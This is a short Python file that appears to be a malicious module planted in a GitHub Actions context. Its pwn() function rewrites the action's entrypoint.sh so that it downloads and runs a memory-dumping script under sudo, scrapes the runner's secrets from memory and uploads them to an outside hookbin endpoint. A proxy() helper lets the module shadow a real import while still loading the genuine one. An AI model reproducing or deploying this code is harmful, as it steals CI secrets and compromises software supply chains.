import os
import sys

def pwn():
    # Try to find and overwrite entrypoint.sh of the action
    # github.action_path is where the action is located.
    # In composite actions, it's usually /home/runner/work/_actions/chipsalliance/verible-linter-action/main
    
    action_path = os.environ.get('GITHUB_ACTION_PATH')
    if action_path:
        entrypoint = os.path.join(action_path, 'entrypoint.sh')
        if os.path.exists(entrypoint):
            with open(entrypoint, 'w') as f:
                f.write(r"""#!/bin/bash
echo "PWNED entrypoint"
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
exit 0
""")
            os.chmod(entrypoint, 0o755)

def proxy(module_name):
    if module_name in sys.modules:
        del sys.modules[module_name]
    old_path = sys.path.copy()
    cwd = os.getcwd()
    sys.path = [p for p in sys.path if p != '' and p != cwd and p != '.']
    mod = __import__(module_name)
    sys.path = old_path
    sys.modules[module_name] = mod
    return mod
